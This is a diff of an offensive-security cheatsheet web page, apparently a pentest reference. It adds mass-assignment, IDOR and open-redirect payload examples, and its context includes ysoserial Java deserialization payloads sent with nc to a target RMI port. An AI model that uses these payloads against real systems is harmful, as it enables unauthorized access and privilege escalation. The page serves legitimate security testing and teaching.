@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-11-21T10:04:01 CET">
+<meta name="revised" content="2020-01-04T16:29:47 CET">
 <title>MISC &amp; Others :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -276,6 +276,13 @@
         <div>
           <a href="/open-source-intelligence-osint/human-recon/social-networks/tinder/">
             Tinder
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/human-recon/social-networks/snapchat/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/human-recon/social-networks/snapchat/">
+            Snapchat
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
@@ -615,6 +622,13 @@
         <div>
           <a href="/web-attacks/client-side-injections/csrf/">
             CSRF Injections
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/web-attacks/client-side-injections/misc_others/" class="dd-item">
+        <div>
+          <a href="/web-attacks/client-side-injections/misc_others/">
+            MISC &amp; Others
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
@@ -1423,6 +1437,8 @@
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Security Headers</span>
 https://securityheaders.com
 
+<span style="color:#75715e"># /!\ HTTP POST Requests needs two carriage return at the end to be valid !</span>
+
 <span style="color:#75715e"># Install files</span>
 <span style="color:#75715e"># You can check for backup files using the following extensions</span>
 .backup, .bck, .old, .save, .bak, .sav, ~, .copy, .old, .orig, .tmp, .txt, .back, .bkp, .bac, .tar, .gz, .tar.gz, .zip, .rar
@@ -1477,7 +1493,12 @@ https://emojipedia.org/pile-of-poo/
 0x00, 0x2F, 0x3A, 0x40, 0x5B, 0x60, 0x7B, 0xFF
 %00, %2F, %3A, %40, %5B, %60, %7B, %FF
 
-<span style="color:#75715e"># Unclaimed domains in a code source can lead to XSS</span></code></pre></div>
+<span style="color:#75715e"># Unclaimed domains in a code source can lead to XSS</span>
+
+<span style="color:#75715e"># If some JSON objects are in the response but not in the request</span>
+<span style="color:#75715e"># Try do add them in the request, you could override properties</span>
+<span style="color:#f92672">{</span><span style="color:#d88200">&#34;id&#34;</span>:<span style="color:#d88200">&#34;7&#34;</span><span style="color:#f92672">}</span> <span style="color:#f92672">=</span>&gt; <span style="color:#f92672">{</span><span style="color:#d88200">&#34;id&#34;</span>:<span style="color:#d88200">&#34;7&#34;</span>, <span style="color:#d88200">&#34;admin&#34;</span>:false<span style="color:#f92672">}</span>
+<span style="color:#f92672">{</span><span style="color:#d88200">&#34;id&#34;</span>:<span style="color:#d88200">&#34;7&#34;</span>, <span style="color:#d88200">&#34;admin&#34;</span>:true<span style="color:#f92672">}</span> <span style="color:#f92672">=</span>&gt; <span style="color:#f92672">{</span><span style="color:#d88200">&#34;id&#34;</span>:<span style="color:#d88200">&#34;7&#34;</span>, <span style="color:#d88200">&#34;admin&#34;</span>:true<span style="color:#f92672">}</span></code></pre></div>
 <p><br/></p>
 
 <h3 id="idor-insecure-directo-object-reference">IDOR (Insecure Directo Object Reference)</h3>
@@ -1485,7 +1506,12 @@ https://emojipedia.org/pile-of-poo/
 <span style="color:#75715e"># You can use the same parameter several times</span>
 api.example/profile?UserId<span style="color:#f92672">=</span><span style="color:#ae81ff">123</span> <span style="color:#75715e"># Ok, your profile</span>
 api.example/profile?UserId<span style="color:#f92672">=</span><span style="color:#ae81ff">456</span> <span style="color:#75715e"># ERROR</span>
-api.example/profile?UserId<span style="color:#f92672">=</span><span style="color:#ae81ff">456</span><span style="color:#111">&amp;</span><span style="color:#111">UserId</span><span style="color:#f92672">=</span><span style="color:#ae81ff">123</span> <span style="color:#75715e"># OK, it can work</span></code></pre></div>
+api.example/profile?UserId<span style="color:#f92672">=</span><span style="color:#ae81ff">456</span><span style="color:#111">&amp;</span><span style="color:#111">UserId</span><span style="color:#f92672">=</span><span style="color:#ae81ff">123</span> <span style="color:#75715e"># OK, it can work</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Tips</span>
+<span style="color:#75715e"># - Some encoded/hashed IDs can be predictable --&gt; Create accounts to see</span>
+<span style="color:#75715e"># - Try some id, user_id, message_id even if the application seems to not offer it (on API for ex)</span>
+<span style="color:#75715e"># - Parameter Polluttion (HPP)</span>
+<span style="color:#75715e"># - Switch between POST and PUT to bypass potential controls</span>
+<span style="color:#75715e"># -</span> </code></pre></div>
 <p><br/></p>
 
 <h3 id="hidden-parameters">Hidden parameters</h3>
@@ -1628,6 +1654,14 @@ java -jar ysoserial.jar CommonsCollections1 calc.exe <span style="color:#111">|<
 java -jar ysoserial.jar Groovy1 calc.exe &gt; groovypayload.bin
 nc <span style="color:#ae81ff">10</span>.10.10.10 <span style="color:#ae81ff">1099</span> &lt; groovypayload.bin
 java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost <span style="color:#ae81ff">1099</span> CommonsCollections1 calc.exe</code></pre></div>
+<p><br/></p>
+
+<h3 id="open-redirect">Open Redirect</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Some examples</span>
+verification-success?redirectTo<span style="color:#f92672">=</span>https%3a%2f%2fgoogle%2ecom%5c%2ewww%2eupwork%2ecom%2f<span style="color:#111">&amp;</span><span style="color:#111">flowName</span><span style="color:#f92672">=</span>client_high_potential
+<span style="color:#111">redirect_after_login</span><span style="color:#f92672">=</span>https%3a%2f%2f%63%61%72%64s%2etwitter%2ecom%2fcards%2f18ce54su0k1%2f6tc5h
+launchauth/?webbasedpurchasing<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#111">&amp;</span><span style="color:#111">transid</span><span style="color:#f92672">=</span><span style="color:#ae81ff">2614806773554997295</span><span style="color:#111">&amp;</span><span style="color:#111">authurl</span><span style="color:#f92672">=</span>https%3A%2F%2Fduckduckgo.com%2Forb%2Forb%3FACTION%3DDO_START%26REF%3D000000003700003159190000100001%26MAC%3D7UYgidiXPXlSwepsEkIkt2cjtzUjBN4cskq05erf%252Bhk%253D<span style="color:#111">&amp;</span><span style="color:#111">s</span><span style="color:#f92672">=</span>5b57c3c66fea1edb71950f1b
+login?u<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span><span style="color:#111">&amp;</span><span style="color:#111">to</span><span style="color:#f92672">=</span>YXdheS5waHA/dG89aHR0cDovL2FtcC5ncy9Wb3VxJnBvc3Q9LTIwNjI5NzI0XzExNjAyMDImY2Nfa2V5P</code></pre></div>
 
     
     
